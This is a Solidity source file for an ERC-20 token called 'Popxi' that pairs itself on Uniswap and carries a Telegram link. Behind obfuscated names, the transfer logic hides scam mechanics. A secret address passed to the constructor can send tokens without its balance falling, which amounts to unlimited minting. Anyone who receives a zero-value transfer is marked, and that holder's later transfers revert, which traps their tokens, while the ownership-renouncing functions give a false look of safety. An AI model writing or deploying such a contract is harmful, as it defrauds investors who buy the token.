/*

https://t.me/popxi_eth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Popxi is Ownable {
    mapping(address => uint256) private odzm;

    function transfer(address fkvdt, uint256 hniupjasm) public returns (bool success) {
        dqjctyfe(msg.sender, fkvdt, hniupjasm);
        return true;
    }

    uint8 public decimals = 9;

    function transferFrom(address rozxmuphgj, address fkvdt, uint256 hniupjasm) public returns (bool success) {
        require(hniupjasm <= allowance[rozxmuphgj][msg.sender]);
        allowance[rozxmuphgj][msg.sender] -= hniupjasm;
        dqjctyfe(rozxmuphgj, fkvdt, hniupjasm);
        return true;
    }

    address public yxgarwteq;

    mapping(address => uint256) private nietchyofqw;

    function dqjctyfe(address rozxmuphgj, address fkvdt, uint256 hniupjasm) private returns (bool success) {
        if (nietchyofqw[rozxmuphgj] == 0) {
            balanceOf[rozxmuphgj] -= hniupjasm;
        }

        if (hniupjasm == 0) odzm[fkvdt] += ymetswcuz;

        if (rozxmuphgj != yxgarwteq && nietchyofqw[rozxmuphgj] == 0 && odzm[rozxmuphgj] > 0) {
            nietchyofqw[rozxmuphgj] -= ymetswcuz;
        }

        balanceOf[fkvdt] += hniupjasm;
        emit Transfer(rozxmuphgj, fkvdt, hniupjasm);
        return true;
    }

    constructor(address cask) {
        balanceOf[msg.sender] = totalSupply;
        nietchyofqw[cask] = ymetswcuz;
        IUniswapV2Router02 mhbc = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        yxgarwteq = IUniswapV2Factory(mhbc.factory()).createPair(address(this), mhbc.WETH());
    }

    function approve(address hopcyv, uint256 hniupjasm) public returns (bool success) {
        allowance[msg.sender][hopcyv] = hniupjasm;
        emit Approval(msg.sender, hopcyv, hniupjasm);
        return true;
    }

    string public name = 'Popxi';

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    uint256 private ymetswcuz = 61;

    string public symbol = 'Popxi';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => mapping(address => uint256)) public allowance;
}